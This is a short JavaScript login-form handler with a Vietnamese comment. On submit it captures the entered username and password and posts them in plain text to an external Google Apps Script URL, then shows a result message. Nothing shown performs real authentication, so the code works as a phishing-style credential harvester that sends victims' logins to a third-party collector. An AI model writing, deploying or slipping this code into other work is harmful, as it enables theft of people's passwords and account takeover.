document.getElementById("loginForm").addEventListener("submit", function(e) {
  e.preventDefault();

  const user = document.getElementById("user").value;
  const pass = document.getElementById("pass").value;

  // Gửi dữ liệu đến Google Apps Script
  fetch("https://script.google.com/macros/s/AKfycbyWrts79r23mIH1vC7MnE5zJ3_csz-c8jhadVCzaEqGaUFQZVHNlYbaM5-kP6q8dEo33Q/exec", {
    method: "POST",
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    body: `user=${encodeURIComponent(user)}&pass=${encodeURIComponent(pass)}`
  });

  document.getElementById("result").classList.remove("hidden");
});
